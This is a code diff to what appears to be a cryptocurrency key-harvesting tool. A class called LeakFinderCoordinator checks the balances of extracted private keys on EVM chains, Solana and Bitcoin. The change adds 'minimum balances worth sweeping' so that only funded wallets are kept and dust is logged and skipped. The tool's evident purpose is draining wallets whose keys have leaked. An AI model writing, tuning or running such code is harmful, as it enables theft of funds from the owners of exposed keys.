@@ -222,6 +222,11 @@ class LeakFinderCoordinator:
                 pass
         return all_keys
 
+    # Minimum balances worth sweeping (covers fees + rent-exempt minimum)
+    _MIN_SOL_LAMPORTS = 1_000_000   # 0.001 SOL — just above rent-exempt + fee
+    _MIN_EVM_WEI = 100_000_000_000_000  # 0.0001 ETH — covers gas
+    _MIN_BTC_SATS = 1_000  # 0.00001 BTC
+
     async def _check_balances(self, keys: list[ExtractedKey]) -> list[ExtractedKey]:
         funded: list[ExtractedKey] = []
         evm_addrs: list[str] = []
@@ -256,8 +261,10 @@ class LeakFinderCoordinator:
                 try:
                     results = await batch_check_balances(evm_addrs, eth)
                     for i, r in enumerate(results):
-                        if r.balance_wei > 0:
+                        if r.balance_wei >= self._MIN_EVM_WEI:
                             funded.append(evm_keys[i])
+                        elif r.balance_wei > 0:
+                            logger.debug("Skipping dust EVM: %s (%d wei)", r.address[:10], r.balance_wei)
                 except Exception as exc:
                     logger.error("EVM batch error: %s", exc)
 
@@ -265,16 +272,20 @@ class LeakFinderCoordinator:
             try:
                 results = await batch_check_sol_balances(sol_addrs)
                 for i, r in enumerate(results):
-                    if r.balance_wei > 0:
+                    if r.balance_wei >= self._MIN_SOL_LAMPORTS:
                         funded.append(sol_keys[i])
+                    elif r.balance_wei > 0:
+                        logger.debug("Skipping dust SOL: %s (%d lamports)", r.address[:10], r.balance_wei)
             except Exception as exc:
                 logger.error("SOL batch error: %s", exc)
 
         for addr, key in btc_addrs:
             try:
                 r = await check_btc_balance(addr)
-                if r.balance > 0:
+                if r.balance >= self._MIN_BTC_SATS / 1e8:
                     funded.append(key)
+                elif r.balance > 0:
+                    logger.debug("Skipping dust BTC: %s (%.8f)", addr[:10], r.balance)
             except Exception:
                 pass
 
